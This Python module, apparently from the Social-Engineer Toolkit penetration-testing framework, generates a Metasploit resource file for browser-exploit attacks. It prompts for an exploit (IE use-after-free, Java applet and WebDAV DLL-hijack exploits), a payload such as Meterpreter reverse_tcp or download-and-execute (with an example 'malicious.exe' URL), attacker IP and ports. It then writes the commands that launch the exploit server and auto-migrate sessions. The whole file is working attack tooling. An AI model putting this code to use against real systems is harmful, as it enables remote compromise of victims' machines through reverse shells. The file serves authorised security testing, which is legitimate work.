import re
import os
from src.core.setcore import *
from src.core.menu.text import *
from src.core.dictionaries import *
definepath = os.getcwd()
me = mod_name()
port = ""
multiattack = "off"
webdav_enabled = "off"
if os.path.isfile(userconfigpath + "multi_payload"):
    multiattack = "on"
    webdav_enabled = "off"
    webdav_write = open(userconfigpath + "webdav_enabled", "w")
    fileopen = open(userconfigpath + "multi_payload", "r")
    for line in fileopen:
        match = re.search("MAIN=", line)
        if match:
            port = line.replace("MAIN=", "")
        match2 = re.search("MAINPAYLOAD=", line)
        if match2:
            exploit = line.replace("MAINPAYLOAD=", line)
metasploit_iframe = "8080"
msf_path = meta_path()
configfile = open("/etc/setoolkit/set.config", "r").readlines()
for line in configfile:
    line = line.rstrip()
    match4 = re.search("METERPRETER_MULTI_SCRIPT=", line)
    if match4:
        meterpreter_multi = line.replace("METERPRETER_MULTI_SCRIPT=", "")
    match5 = re.search("METERPRETER_MULTI_COMMANDS=", line)
    if match5:
        meterpreter_multi_command = line.replace(
            "METERPRETER_MULTI_COMMANDS=", "")
        meterpreter_multi_command = meterpreter_multi_command.replace(
            ";", "\n")
    match6 = re.search("METASPLOIT_IFRAME_PORT=", line)
    if match6:
        metasploit_iframe = line.replace("METASPLOIT_IFRAME_PORT=", "")
    match7 = re.search("AUTO_MIGRATE=", line)
    if match7:
        auto_migrate = line.replace("AUTO_MIGRATE=", "")
attack_vector = ""
if os.path.isfile(userconfigpath + "attack_vector"):
    fileopen = open(userconfigpath + "attack_vector")
    for line in fileopen:
        attack_vector = line.rstrip()
if check_options("IPADDR=") != 0:
    ipaddr = check_options("IPADDR=")
else:
    ipaddr = input("Enter your ipaddress: ")
    update_options("IPADDR=" + ipaddr)
debug_msg(me, "printing 'text.browser_exploits_menu'", 5)
show_browserexploit_menu = create_menu(
    browser_exploits_text, browser_exploits_menu)
exploit = input(setprompt(["4"], ""))
if exploit == '':
    print("\n   Defaulting to IE CSS Import Use After Free exploit.....")
    exploit = ("1")
exploit = ms_module(exploit)
choice1 = ""
if multiattack == "off":
    if exploit != "windows/browser/java_codebase_trust":
        show_payload_menu_2 = create_menu(payload_menu_2_text, payload_menu_2)
        choice1 = input(setprompt(["4"], ""))
if choice1 == '':
    choice1 = '2'
choice1 = ms_payload(choice1)
if exploit == "exploit/windows/browser/java_codebase_trust" or exploit == "exploit/multi/browser/java_atomicreferencearray" or exploit == "exploit/multi/browser/java_verifier_field_access" or exploit == "exploit/multi/browser/java_jre17_exec" or exploit == "exploit/multi/browser/java_jre17_jmxbean" or exploit == "exploit/multi/browser/java_jre17_jmxbean_2":
    print("[*] Selecting Java Meterpreter as payload since it is exploit specific.")
    choice1 = ("java/meterpreter/reverse_tcp")
if multiattack == "off":
    port = input(setprompt(["4"], "Port to use for the reverse [443]"))
    if port == "":
        port = "443"
if not os.path.isfile(userconfigpath + "multi_java"):
    filewrite = open(userconfigpath + "meta_config", "w")
if os.path.isfile(userconfigpath + "multi_java"):
    filewrite = open(userconfigpath + "meta_config", "a")
filewrite.write("use " + exploit + "\n")
filewrite.write("set PAYLOAD " + choice1 + "\n")
filewrite.write("set LHOST " + ipaddr + "\n")
filewrite.write("set LPORT %s" % (port) + "\n")
filewrite.write("set URIPATH /" + "\n")
if choice1 == ("windows/download_exec"):
    print("You selected the download and execute payload. Enter the URL to your executable.")
    print("Example would be http://172.16.32.129/malicious.exe")
    set_url = input(setprompt(["4"], "URL to the executable"))
    filewrite.write("set URL %s" % (set_url) + "\n")
if exploit != 'windows/browser/ms10_042_helpctr_xss_cmd_exec':
    if exploit != 'windows/browser/ms10_046_shortcut_icon_dllloader':
        if exploit != 'windows/browser/webdav_dll_hijacker':
            filewrite.write("set SRVPORT %s" % (metasploit_iframe) + "\n")
if exploit == 'windows/browser/ms10_042_helpctr_xss_cmd_exec':
    filewrite.write("set SRVPORT 80" + "\n")
    if multiattack == "on":
        webdav_write.write("WEBDAV_ENABLED")
if exploit == 'windows/browser/ms10_046_shortcut_icon_dllloader':
    filewrite.write("set SRVPORT 80" + "\n")
    if multiattack == "on":
        webdav_write.write("WEBDAV_ENABLED")
if exploit == 'windows/browser/webdav_dll_hijacker':
    filewrite.write("set SRVPORT 80" + "\n")
    if multiattack == "on":
        webdav_write.write("WEBDAV_ENABLED")
    extension = input(
        setprompt(["4"], "Extension types for this exploit [all]"))
    if extension == '':
        filewrite.write(
            "set EXTENSIONS p7c wab ppt pptx zip vsd docx grp snag wbcat eml odp pot ppsx htm html" + "\n")
    else:
        filewrite.write("set EXTENSIONS %s" % (extension) + "\n")
filewrite.write("set ExitOnSession false\n")
if meterpreter_multi == "ON":
    multiwrite = open(userconfigpath + "multi_meter.file", "w")
    multiwrite.write(meterpreter_multi_command)
    filewrite.write(
        "set InitialAutorunScript multiscript -rc %s/multi_meter.file\n" % (userconfigpath))
    multiwrite.close()
if auto_migrate == "ON":
    filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
filewrite.write("exploit -j\r\n\r\n")
filewrite.close()
if webdav_enabled == "on":
    webdav_write.close()
if exploit == ("windows/browser/java_docbase_bof"):
    filewrite = open(userconfigpath + "docbase.file", "w")
    filewrite.write("DOCBASE=ON")
    filewrite.close()